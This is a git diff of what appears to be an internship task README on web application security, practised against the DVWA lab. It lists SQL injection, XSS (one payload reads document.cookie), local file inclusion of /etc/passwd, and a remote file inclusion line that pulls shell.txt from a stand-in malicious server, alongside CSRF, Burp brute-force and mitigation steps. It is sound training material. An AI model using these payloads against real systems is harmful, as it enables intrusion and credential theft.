@@ -212,17 +212,12 @@ sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
 sudo iptables -F
 ```
 
-```
--------------------------------------------------------------------------------------------------------------------------------
-# 🛡️ Cybersecurity & Ethical Hacking Internship - Task 3
-
+``                                                                                                                                                                                                                                                                                                                                         
+**# 🛡️Cybersecurity & Ethical Hacking Internship - Task 3**                                                                                                                                                                                                                                                                                                                   
 **Company:** ApexPlanet Software Pvt. Ltd.  
 **Domain:** Cybersecurity & Ethical Hacking  
 **Task Name:** Web Application Security  
-**Timeline:** Days 25–36  
-
----
-
+**Timeline:** Days 25-36
 ## 📌 Objective
 To identify, exploit, and mitigate OWASP Top 10 vulnerabilities within a controlled web application lab environment.
 
@@ -269,3 +264,42 @@ To identify, exploit, and mitigate OWASP Top 10 vulnerabilities within a control
 ' OR '1'='1
 # 3. Extract database details, table names, and user credentials
 # 4. Analyze vulnerable PHP backend source code and implement Prepared Statements
+
+### Step 2: Cross-Site Scripting (XSS)
+```bash
+# Stored XSS Test Payload (Input field / Guestbook):
+<script>alert('Stored XSS Vulnerability');</script>
+
+# Reflected XSS Test Payload (URL parameter):
+http://target-ip/dvwa/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>
+
+# Implement Input Sanitization and Content Security Policy (CSP headers)
+
+### Step 3: Cross-Site Request Forgery (CSRF)
+Bash
+# 1. Navigate to DVWA CSRF module
+# 2. Capture password change request using Burp Suite
+# 3. Generate HTML proof-of-concept CSRF exploit page targeting user password modification
+# 4. Implement Anti-CSRF tokens in form parameters to block unauthorized state-changing
+
+Step 4: File Inclusion Attacks
+Bash
+# Local File Inclusion (LFI) Test Path:
+http://target-ip/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
+
+# Remote File Inclusion (RFI) Test Parameter:
+http://target-ip/dvwa/vulnerabilities/fi/?page=http://malicious-server/shell.txt
+
+Step 5: Burp Suite Advanced
+Bash
+# 1. Configure browser to route traffic through Burp Suite proxy (127.0.0.1:8080)
+# 2. Intercept and modify active authentication requests
+# 3. Send target parameters to Burp Intruder for automated fuzzing and brute-force attacks
+
+Step 6: Web Security Headers Configuration
+Bash
+# Analyze target site configuration using securityheaders.com
+# Add/Modify HTTP security headers in Apache configuration file (/etc/apache2/apache2.conf or site config):
+Header always set X-Frame-Options "DENY"
+Header always set X-Content-Type-Options "nosniff"
+Header always set Content-Security-Policy "default-src 'self'"
